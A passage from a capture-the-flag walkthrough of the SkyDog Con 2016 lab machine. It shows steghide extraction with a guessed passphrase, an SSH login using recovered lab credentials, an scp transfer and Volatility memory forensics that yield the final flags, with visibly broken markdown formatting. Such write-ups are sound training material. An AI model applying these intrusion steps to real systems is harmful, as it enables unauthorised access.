-<p><img class="center" src="/images/pentest/skydogctf/invoice.jpg" title="&lsquo;invoice&rsquo; &lsquo;invoice&rsquo;" ></p>
-
-<p>This might suggest the use of steganography in the image, and this is confirmed if you search for Stefan Hetzl, it turns out he&rsquo;s the author of steghide! And we have the previous hint of panam, which is the passphrase in this case:</p>
-
-<p>```
-steghide extract -sf image.jpg
-Enter passphrase:
-wrote extracted data to &ldquo;flag.txt&rdquo;.
-root@kali:~/Downloads# cat flag.txt
-flag{d1e5146b171928731385eb7ea38c37b8}
-=ILoveFrance</p>
-
-<p>clue=iheartbrenda
-```</p>
-
-<h2>Flag #7 Frank Was Caught on Camera Cashing Checks and Yelling &ndash; I’m The Fastest Man Alive!</h2>
-
-<p>This was a movie reference and I had to look it up in other solutions&hellip;&ldquo;I’m The Fastest Man Alive!&rdquo; is a reference to The Flash, whose real name is Barry Allen. For the next part, log in to SSH with the the username <em>barryallen</em> and the password <em>iheartbrenda</em>.</p>
-
-<p><code>
-ssh barryallen@192.168.145.136 -p 22222
-[...]
-barryallen@skydogconctf2016:~$ cat flag.txt
-flag{bd2f6a1d5242c962a05619c56fa47ba6}
-</code></p>
-
-<p>And the hint for the last flag is <code>theflash</code>.</p>
-
-<h2>Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!</h2>
-
-<p>Inside barryallen&rsquo;s home there&rsquo;s a 72M ZIP file called security-system.data:</p>
-
-<p><code>
-barryallen@skydogconctf2016:~$ file security-system.data
-security-system.data: Zip archive data, at least v2.0 to extract
-</code></p>
-
-<p>I transferred it to my machine with scp:</p>
-
-<p>```
-scp -P 22222 barryallen@192.168.145.136:security-system.data .</p>
-
-<h6>#</h6>
-
-<h1>WARNING</h1>
-
-<h1>FBI &ndash; Authorized access only!                 #</h1>
-
-<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>
-
-<h1>All actions Will be monitored and recorded</h1>
-
-<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>
-
-<h6>#</h6>
-
-<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x62;&#x61;&#114;&#x72;&#121;&#97;&#108;&#108;&#x65;&#110;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#x36;">&#98;&#97;&#114;&#x72;&#x79;&#97;&#108;&#x6c;&#x65;&#x6e;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x34;&#x35;&#x2e;&#49;&#51;&#54;</a>&rsquo;s password:
-security-system.data                          100%   71MB   6.6MB/s   00:10  <br/>
-```</p>
-
-<p>I unzipped the archive, but the file command didn&rsquo;t identify it as something specific, it just said it&rsquo;s data. I ran strings on it and saw various references to memory that seem to be linked to a Windows system. Time for some memory forensics with Volatility!</p>
-
-<p>First, we need to identify what type of image we&rsquo;re working with:</p>
-
-<h2>``` </h2>
-
-<h2>Module ImageInfo</h2>
-
-<p>Identify information for the image</p>
-
-<p>volatility imageinfo -f data
-Volatility Foundation Volatility Framework 2.6
-INFO    : volatility.debug    : Determining profile based on KDBG search&hellip;</p>
-
-<pre><code>      Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
-                 AS Layer1 : IA32PagedMemoryPae (Kernel AS)
-                 AS Layer2 : FileAddressSpace (/root/Downloads/data)
-                  PAE type : PAE
-                       DTB : 0x33e000L
-                      KDBG : 0x80545b60L
-      Number of Processors : 1
- Image Type (Service Pack) : 3
-            KPCR for CPU 0 : 0xffdff000L
-         KUSER_SHARED_DATA : 0xffdf0000L
-       Image date and time : 2016-10-10 22:00:50 UTC+0000
- Image local date and time : 2016-10-10 18:00:50 -0400
-</code></pre>
-
-<p>```</p>
-
-<p>It&rsquo;s an image of a Windows XP machine! Next, let&rsquo;s look at the processes:</p>
-
-<h2>``` </h2>
-
-<h2>Module PSList</h2>
-
-<p>Print all running processes by following the EPROCESS lists</p>
-
-<p>volatility pslist -f data
-Volatility Foundation Volatility Framework 2.6
-Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit</p>
-
-<hr />
-
-<p>0x867c6830 System                    4      0     57      171 &mdash;&mdash;&mdash;      0                                                            <br/>
-0x86262900 smss.exe                332      4      3       19 &mdash;&mdash;&mdash;      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x8623b978 csrss.exe               560    332     10      423      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x865ed020 winlogon.exe            588    332     24      512      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x8662d808 services.exe            664    588     15      263      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x866a5670 lsass.exe               676    588     25      356      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x86358a70 vmacthlp.exe            848    664      1       25      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x86651da0 svchost.exe             860    664     21      202      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x865c2790 svchost.exe             944    664     11      258      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x86554020 svchost.exe            1040    664     82     1287      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x866196b8 svchost.exe            1092    664      5       59      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
-0x8643ca18 svchost.exe            1144    664     17      213      0      0 2016-10-10 21:59:15 UTC+0000                               <br/>
-0x866fca88 explorer.exe           1540   1520     14      417      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
-0x8656b4d0 spoolsv.exe            1636    664     15      125      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
-0x86338640 VGAuthService.e        1900    664      2       60      0      0 2016-10-10 21:59:25 UTC+0000                               <br/>
-0x8667bda0 vmtoolsd.exe           2012    664      9      271      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
-0x864f6440 wmiprvse.exe            488    860     14      251      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
-0x864fbad0 wscntfy.exe             536   1040      1       31      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
-0x85e5dd48 alg.exe                 624    664      8      110      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
-0x866f98b0 vmtoolsd.exe           1352   1540      7      242      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
-0x86674410 ctfmon.exe             1356   1540      1       79      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
-0x865bea48 CCleaner.exe           1388   1540      5      108      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
-0x865c3d78 cmd.exe                1336   1540      1       30      0      0 2016-10-10 22:00:05 UTC+0000                               <br/>
-0x8634fbb8 wuauclt.exe            1884   1040      9      198      0      0 2016-10-10 22:00:13 UTC+0000                               <br/>
-0x86260a78 wuauclt.exe            1024   1040      6      172      0      0 2016-10-10 22:00:29 UTC+0000                               <br/>
-0x8667b488 notepad.exe             268   1540      1       55      0      0 2016-10-10 22:00:41 UTC+0000                               <br/>
-0x8640cc10 cmd.exe                1276   2012      0 &mdash;&mdash;&mdash;&mdash;      0      0 2016-10-10 22:00:49 UTC+0000   2016-10-10 22:00:50 UTC+0000
-```</p>
-
-<p>I took note of that Notepad process and several cmd.exes and then dumped the files:</p>
-
-<h2>``` </h2>
-
-<h2>Module FileScan</h2>
-
-<p>Pool scanner for file objects</p>
-
-<p>volatility filescan -f data > filelist.txt
-Volatility Foundation Volatility Framework 2.6
-```</p>
-
-<p>I searched for the string code in the resulting list of files and got a hit:</p>
-
-<p><code>
-grep "code" filelist.txt
-0x0000000005e612f8      1      0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
-0x00000000062e04b0      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
-0x00000000064900a0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\unicode.nls
-0x0000000006640bc8      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
-</code></p>
-
-<p>Maybe this code.txt file is connected to the running Notepad process. I used Volatility&rsquo;s notepad plugin to dump the text found into Notepad:</p>
-
-<h2>``` </h2>
-
-<h2>Module Notepad</h2>
-
-<p>List currently displayed notepad text</p>
-
-<p>volatility notepad -f data
-Volatility Foundation Volatility Framework 2.6
-Process: 268
-Text:
-?</p>
-
-<p>Text:
-d</p>
-
-<p>Text:</p>
-
-<p>Text:
-?</p>
-
-<p>Text:
-66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d
-```</p>
-
-<p>We have a hex string! Decoding it yields the final flag: <code>flag{841dd3db29b0fbbd89c7b5be768cdc81}</code>. And the decoded value for the last flag is <code>Two[space]little[space]mice</code></p>
-
-<p>This is it for the SkyDog Con CTF machine! I particularly liked the memory forensics part at the end!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Q: Do you know what the death rate \
-\ around here is? A: One per person. /</p>
 
 <hr />
 
